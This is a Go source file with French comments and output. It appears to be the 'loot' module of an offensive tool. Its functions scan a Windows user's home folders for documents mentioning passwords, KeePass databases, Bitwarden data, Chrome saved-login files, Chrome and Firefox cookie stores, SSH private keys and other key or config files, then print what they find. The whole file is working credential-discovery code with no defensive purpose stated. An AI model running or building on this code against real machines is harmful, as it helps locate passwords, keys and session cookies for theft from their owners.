package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func SearchSensitiveFiles() {
	fmt.Println("\n💰 LOOT - RECHERCHE DE DONNÉES SENSIBLES")
	fmt.Println("==========================================")

	// 1. Fichiers sensibles classiques
	findSensitiveFiles()

	// 2. Mots de passe dans les fichiers
	SearchForPasswords()

	// 3. Gestionnaires de mots de passe
	DetectPasswordManagers()

	// 4. Cookies navigateur
	GetBrowserCookies()

	fmt.Println("\n✅ Scan terminé")
}

// 1. Chercher des mots de passe dans les fichiers
func SearchForPasswords() {
	fmt.Println("\n🔍 Recherche de mots de passe dans les fichiers...")

	extensions := []string{".txt", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".json", ".xml", ".conf", ".config", ".env"}
	keywords := []string{"password", "mot de passe", "pwd", "pass", "mdp", "credentials", "login"}

	userHome, _ := os.UserHomeDir()
	scanDirs := []string{
		userHome + "\\Desktop",
		userHome + "\\Documents",
		userHome + "\\Downloads",
	}

	for _, dir := range scanDirs {
		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(path))
			for _, validExt := range extensions {
				if ext == validExt {
					file, _ := os.Open(path)
					defer file.Close()

					buffer := make([]byte, 102400)
					n, _ := file.Read(buffer)
					content := strings.ToLower(string(buffer[:n]))

					for _, keyword := range keywords {
						if strings.Contains(content, keyword) {
							fmt.Printf("  ⚠️ Mot de passe potentiel dans: %s\n", path)
							break
						}
					}
					break
				}
			}
			return nil
		})
	}
}

// 2. Détecter les gestionnaires de mots de passe
func DetectPasswordManagers() {
	fmt.Println("\n🔍 Recherche de gestionnaires de mots de passe...")

	// KeePass
	keepassPaths := []string{
		os.Getenv("APPDATA") + "\\KeePass",
		os.Getenv("LOCALAPPDATA") + "\\KeePass",
		"C:\\Program Files\\KeePass Password Safe",
	}

	for _, path := range keepassPaths {
		if _, err := os.Stat(path); err == nil {
			fmt.Printf("  ⚠️ KeePass détecté: %s\n", path)
			filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
				if err == nil && !info.IsDir() && strings.HasSuffix(p, ".kdbx") {
					fmt.Printf("    📁 Base KeePass trouvée: %s\n", p)
				}
				return nil
			})
		}
	}

	// Bitwarden
	bitwardenPaths := []string{
		os.Getenv("APPDATA") + "\\Bitwarden",
		os.Getenv("LOCALAPPDATA") + "\\Bitwarden",
	}

	for _, path := range bitwardenPaths {
		if _, err := os.Stat(path); err == nil {
			fmt.Printf("  ⚠️ Bitwarden détecté: %s\n", path)
		}
	}

	// Chrome mots de passe
	chromePath := os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
	if _, err := os.Stat(chromePath); err == nil {
		fmt.Printf("  ⚠️ Mots de passe Chrome détectés\n")
	}
}

// 3. Chercher les cookies navigateur
func GetBrowserCookies() {
	fmt.Println("\n🍪 Recherche de cookies navigateur...")

	chromeCookies := os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies"
	if _, err := os.Stat(chromeCookies); err == nil {
		fmt.Printf("  ⚠️ Cookies Chrome trouvés\n")
	}

	firefoxProfiles := os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles"
	if files, err := os.ReadDir(firefoxProfiles); err == nil {
		for _, f := range files {
			if f.IsDir() {
				cookiesPath := firefoxProfiles + "\\" + f.Name() + "\\cookies.sqlite"
				if _, err := os.Stat(cookiesPath); err == nil {
					fmt.Printf("  ⚠️ Cookies Firefox trouvés\n")
				}
			}
		}
	}
}

func findSensitiveFiles() {
	fmt.Println("\n🔍 Scan pour fichiers sensibles...")

	userHome, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("  ❌ Erreur:", err)
		return
	}

	extensions := []string{".kdbx", ".key", ".pem", ".ppk", ".conf", ".config", ".env", ".rdp"}

	scanPaths := []string{
		userHome + "\\Desktop",
		userHome + "\\Documents",
		userHome + "\\.ssh",
		userHome + "\\AppData\\Roaming\\KeePass",
	}

	fichierTrouve := 0

	for _, path := range scanPaths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		fmt.Printf("  📁 Scan: %s\n", path)
		files, err := os.ReadDir(path)
		if err != nil {
			continue
		}

		for _, file := range files {
			if file.IsDir() {
				continue
			}

			ext := filepath.Ext(file.Name())
			for _, sensiExt := range extensions {
				if ext == sensiExt {
					fmt.Printf("    🔍 Fichier trouvé: %s\n", file.Name())
					fichierTrouve++
					break
				}
			}
		}
	}

	sshPath := userHome + "\\.ssh"
	if files, err := os.ReadDir(sshPath); err == nil {
		for _, file := range files {
			if !file.IsDir() {
				if file.Name() == "id_rsa" ||
					file.Name() == "id_dsa" ||
					file.Name() == "authorized_keys" ||
					file.Name() == "known_hosts" {
					fmt.Printf("    🔐 Clé SSH: %s\n", file.Name())
					fichierTrouve++
				}
			}
		}
	}

	fmt.Printf("\n📊 Fichiers trouvés: %d\n", fichierTrouve)
}
